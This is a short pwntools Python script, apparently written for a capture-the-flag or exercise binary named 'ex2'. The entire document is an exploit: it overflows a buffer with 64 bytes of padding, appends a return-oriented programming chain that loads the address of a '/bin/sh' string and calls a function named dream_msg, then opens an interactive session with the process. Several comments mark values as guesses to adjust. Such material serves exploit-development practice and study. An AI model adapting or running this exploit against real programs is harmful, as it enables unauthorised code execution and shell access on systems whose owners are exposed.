from pwn import *

# Load the binary
elf = ELF('./ex2')
rop = ROP(elf)

# Get the address of dream_msg (ensure this is correct)
dream_msg = elf.symbols['dream_msg']  # Replace with the actual function name or address

# Start the process
io = process(elf.path)

# Gadgets
# Assuming we have a gadget to pop rax and rbp
pop_rax_rbp_ret = rop.find_gadget(['pop rax', 'pop rbp', 'ret'])[0]  # Gadget for setting up rax and rbp
ret_gadget = rop.find_gadget(['ret'])[0]  # Gadget for stack alignment

# Find the address of the string "/bin/sh" in the binary
string_address = next(elf.search(b'/bin/sh'))  # Adjust if you are looking for another string

# Creating the ROP chain
rop.raw(pop_rax_rbp_ret)  # Prepare to set rax and rbp
rop.raw(string_address)    # Load the address of the string into rax
rop.raw(0x0)               # Placeholder for rbp (not used but necessary)
rop.call(dream_msg)        # Call the dream_msg function

# Build the payload
padding_size = 64  # Adjust this based on the buffer overflow size
payload = b'A' * padding_size  # Padding to overflow the buffer
payload += rop.chain()  # Append the ROP chain

# Send the payload
io.sendline(payload)

# Get an interactive shell
io.interactive()
